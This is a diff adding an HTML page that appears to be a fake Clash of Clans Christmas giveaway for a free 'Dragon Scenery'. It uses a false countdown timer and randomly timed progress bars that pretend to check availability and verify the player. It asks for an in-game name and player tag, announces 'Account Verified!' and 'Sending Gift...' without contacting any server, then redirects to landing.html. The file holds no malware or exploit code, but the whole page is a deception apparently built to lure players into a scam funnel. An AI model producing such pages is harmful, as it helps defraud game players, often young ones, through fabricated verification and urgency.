@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Clash of Clans - Xmas Special</title>
+    <link href="https://fonts.googleapis.com/css2?family=Luckiest+Guy&display=swap" rel="stylesheet">
+    <style>
+        /* --- CORE SETTINGS --- */
+        * { box-sizing: border-box; }
+        
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Luckiest Guy', cursive;
+            background-color: #000;
+            overflow: hidden;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+        }
+
+        /* Background: Winter Theme */
+        .bg-image {
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRjcEe9Me0QO51BZMw6ww-H1vWUaMdZj_lLZ75HxayB6ubxJ5rQ-IJiViI&s=10') no-repeat center center/cover;
+            filter: blur(5px) brightness(0.6);
+            transform: scale(1.1);
+            z-index: -2;
+        }
+
+        /* Snowfall Animation */
+        .snow {
+            position: absolute;
+            width: 100%; height: 100%;
+            background-image: radial-gradient(4px 4px at 100px 50px, #fff , transparent), 
+                              radial-gradient(6px 6px at 200px 150px, #fff, transparent);
+            background-size: 650px 650px;
+            animation: snow 5s linear infinite;
+            z-index: -1;
+            opacity: 0.8;
+            pointer-events: none;
+        }
+        @keyframes snow { to { background-position: 0 650px; } }
+
+        /* --- CARD DESIGN (Santa Theme) --- */
+        .main-card {
+            width: 90%;
+            max-width: 380px;
+            /* Santa Red Gradient */
+            background: linear-gradient(180deg, #b31217 0%, #7a0a0e 100%);
+            border: 4px solid #f2c648; /* Gold Border */
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.8), inset 0 0 30px rgba(0,0,0,0.4);
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+            animation: popIn 0.5s ease-out;
+        }
+
+        @keyframes popIn { 0% { transform: scale(0.5); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
+
+        /* White Fur Top (Santa Style) */
+        .santa-fur {
+            height: 35px;
+            background: #fff;
+            width: 100%;
+            position: absolute;
+            top: 0; left: 0;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+            border-bottom: 2px solid #ddd;
+            z-index: 1;
+        }
+
+        .content-padding { 
+            padding: 50px 20px 25px 20px; /* Top padding clears the fur */
+            position: relative; 
+            z-index: 2;
+        }
+
+        /* --- TEXT STYLES (With Stroke) --- */
+        h1 {
+            font-size: 26px;
+            margin: 0 0 15px 0;
+            color: #fff;
+            /* Text Stroke Effect */
+            -webkit-text-stroke: 1.5px #000;
+            text-shadow: 3px 3px 0 #000;
+            letter-spacing: 1px;
+            line-height: 1.1;
+        }
+
+        .gold-text { color: #ffcc00; }
+
+        /* --- IMAGE BOX FIX --- */
+        .scenery-box {
+            position: relative;
+            width: 100%;
+            background: radial-gradient(circle, rgba(255,215,0,0.2) 0%, rgba(0,0,0,0.4) 100%); /* Glow Background */
+            border: 3px solid #f2c648;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            padding: 10px;
+            box-shadow: inset 0 0 20px rgba(0,0,0,0.5);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .scenery-img {
+            width: 100%;
+            height: 140px; /* Controlled height */
+            object-fit: contain; /* Ensures full image is seen */
+            filter: drop-shadow(0 5px 10px rgba(0,0,0,0.5));
+            animation: float 3s ease-in-out infinite;
+        }
+        
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-5px); }
+        }
+        
+        .tag-free {
+            position: absolute;
+            top: -10px; right: -5px;
+            background: #ff0000;
+            color: white;
+            padding: 4px 10px;
+            font-size: 14px;
+            border: 2px solid white;
+            border-radius: 5px;
+            transform: rotate(10deg);
+            box-shadow: 0 5px 5px rgba(0,0,0,0.5);
+            -webkit-text-stroke: 0.5px #000;
+            z-index: 5;
+        }
+
+        /* --- INPUT FIELDS FIX --- */
+        .input-group { 
+            text-align: left; 
+            margin-bottom: 12px; /* Reduced margin */
+        }
+        
+        .label { 
+            font-size: 15px; 
+            margin-left: 5px; 
+            color: #ffcc00; 
+            text-shadow: 2px 2px 0 #000;
+            -webkit-text-stroke: 0.8px #000;
+            margin-bottom: 4px;
+            display: block;
+        }
+        
+        .coc-input {
+            width: 100%; 
+            padding: 10px; /* Reduced padding */
+            border-radius: 8px;
+            border: 2px solid #5e0b0b; 
+            background: #fff8e1;
+            font-family: sans-serif; 
+            font-weight: bold; 
+            font-size: 14px; /* Slightly smaller font */
+            color: #333; 
+            outline: none;
+            box-shadow: inset 0 2px 4px rgba(0,0,0,0.2);
+        }
+        
+        .coc-input::placeholder { opacity: 0.6; font-weight: normal; }
+
+        /* --- BUTTON --- */
+        .coc-btn {
+            background: linear-gradient(180deg, #75c92c 0%, #4ea805 100%);
+            border: 2px solid #b8ff85;
+            border-bottom: 5px solid #367503;
+            border-radius: 10px;
+            color: white;
+            font-family: 'Luckiest Guy', cursive;
+            font-size: 22px;
+            padding: 12px 0;
+            width: 100%;
+            cursor: pointer;
+            text-shadow: 2px 2px 0 #000;
+            -webkit-text-stroke: 1px #000;
+            transition: transform 0.1s;
+            margin-top: 5px;
+        }
+        .coc-btn:active { transform: translateY(4px); border-bottom: 2px solid #367503; }
+
+        /* --- LOADING BAR --- */
+        .loading-wrap { margin-top: 20px; text-align: center; }
+        .loading-msg { font-size: 18px; color: #ffcc00; margin-bottom: 8px; text-shadow: 2px 2px 0 #000; -webkit-text-stroke: 0.8px #000;}
+        
+        .track {
+            width: 100%; height: 24px; background: #2b0b0b;
+            border: 2px solid #aaa; border-radius: 12px; overflow: hidden;
+            box-shadow: inset 0 3px 5px rgba(0,0,0,0.6);
+        }
+        
+        .bar {
+            height: 100%; width: 0%;
+            background: linear-gradient(180deg, #d342f0 0%, #9b1eb8 100%);
+            position: relative;
+            transition: width 0.1s;
+        }
+        /* Candy Stripe Animation */
+        .bar::after {
+            content: ""; position: absolute; top: 0; left: 0; bottom: 0; right: 0;
+            background: repeating-linear-gradient(45deg, transparent, transparent 10px, rgba(255,255,255,0.2) 10px, rgba(255,255,255,0.2) 20px);
+            animation: stripes 1s linear infinite;
+        }
+        @keyframes stripes { from { background-position: 0 0; } to { background-position: 28px 0; } }
+
+        .hidden { display: none; }
+        .footer-text { font-size: 12px; color: #ffaaaa; margin-top: 15px; font-family: sans-serif; opacity: 0.8; text-shadow: 1px 1px 0 #000; }
+
+    </style>
+</head>
+<body>
+
+    <div class="bg-image"></div>
+    <div class="snow"></div>
+
+    <div class="main-card">
+        <div class="santa-fur"></div>
+
+        <div class="content-padding">
+            
+            <!-- PAGE 1: REWARD -->
+            <div id="page-reward">
+                <h1>FREE <span class="gold-text">DRAGON SCENERY</span></h1>
+                
+                <div class="scenery-box">
+                    <div class="tag-free">FREE</div>
+                    <!-- Updated Image with Contain -->
+                    <img src="https://clashofclans-baselinks.com/wp-content/uploads/2025/06/clash-of-dragons-legendary-scenery-in-clash-of-clans-icon.png" class="scenery-img" alt="Dragon Scenery">
+                </div>
+
+                <p style="font-size:14px; margin-bottom:15px; font-family:sans-serif; color:#ffcccc; text-shadow:1px 1px 0 #000;">
+                    Exclusive Christmas Gift. Claim before the event ends!
+                </p>
+
+                <button class="coc-btn" onclick="startLoading()">CLAIM NOW</button>
+                <div class="footer-text">Time Remaining: 04h 12m</div>
+            </div>
+
+            <!-- PAGE 2: LOADING -->
+            <div id="page-loading" class="hidden loading-wrap">
+                <div class="loading-msg" id="msg1">Checking Availability...</div>
+                <div class="track">
+                    <div class="bar" id="bar1"></div>
+                </div>
+            </div>
+
+            <!-- PAGE 3: FORM -->
+            <div id="page-form" class="hidden">
+                <h1>PLAYER DETAILS</h1>
+                <p style="font-size:13px; font-family:sans-serif; color:#ddd; margin-bottom:15px; text-shadow:1px 1px 0 #000;">
+                    Enter your Game Name and Tag to receive the scenery.
+                </p>
+
+                <div class="input-group">
+                    <span class="label">In-Game Name</span>
+                    <input type="text" id="ign" class="coc-input" placeholder="e.g. DragonSlayer">
+                </div>
+                <div class="input-group">
+                    <span class="label">Player Tag (#)</span>
+                    <input type="text" id="tag" class="coc-input" placeholder="#ABC1234">
+                </div>
+
+                <button class="coc-btn" onclick="verifyForm()">CONFIRM</button>
+            </div>
+
+            <!-- PAGE 4: FINAL VERIFICATION -->
+            <div id="page-final" class="hidden loading-wrap">
+                <div class="loading-msg" id="msg2">Verifying Tag...</div>
+                <div class="track">
+                    <div class="bar" id="bar2" style="background: linear-gradient(180deg, #55ff00 0%, #339900 100%);"></div>
+                </div>
+                <p style="font-size:12px; margin-top:15px; color:#ffcccc; font-family:sans-serif; text-shadow:1px 1px 0 #000;">Do not close the app.</p>
+            </div>
+
+        </div>
+    </div>
+
+    <script>
+        // --- JAVASCRIPT LOGIC ---
+
+        function startLoading() {
+            document.getElementById('page-reward').classList.add('hidden');
+            document.getElementById('page-loading').classList.remove('hidden');
+
+            let bar = document.getElementById('bar1');
+            let msg = document.getElementById('msg1');
+            let width = 0;
+
+            let interval = setInterval(() => {
+                width += Math.random() * 4;
+                if(width > 100) width = 100;
+                bar.style.width = width + '%';
+
+                if(width > 40) msg.innerText = "Connecting to Server...";
+                if(width > 80) msg.innerText = "Allocating Scenery...";
+
+                if(width === 100) {
+                    clearInterval(interval);
+                    setTimeout(() => {
+                        document.getElementById('page-loading').classList.add('hidden');
+                        document.getElementById('page-form').classList.remove('hidden');
+                    }, 500);
+                }
+            }, 80);
+        }
+
+        function verifyForm() {
+            const ign = document.getElementById('ign').value;
+            const tag = document.getElementById('tag').value;
+
+            if(!ign || !tag) {
+                alert("Error: Please fill all fields.");
+                return;
+            }
+
+            document.getElementById('page-form').classList.add('hidden');
+            document.getElementById('page-final').classList.remove('hidden');
+
+            let bar = document.getElementById('bar2');
+            let msg = document.getElementById('msg2');
+            let width = 0;
+
+            let interval = setInterval(() => {
+                width += Math.random() * 3;
+                if(width > 100) width = 100;
+                bar.style.width = width + '%';
+
+                // Realism: Show user name
+                if(width > 20) msg.innerText = `Searching for ${ign}...`;
+                if(width > 60) msg.innerText = "Account Verified!";
+                if(width > 85) msg.innerText = "Sending Gift...";
+
+                if(width === 100) {
+                    clearInterval(interval);
+                    setTimeout(() => {
+                        // --- REDIRECT TO LANDING.HTML ---
+                        window.location.href = "landing.html";
+                    }, 1000);
+                }
+            }, 100);
+        }
+    </script>
+</body>
+</html>
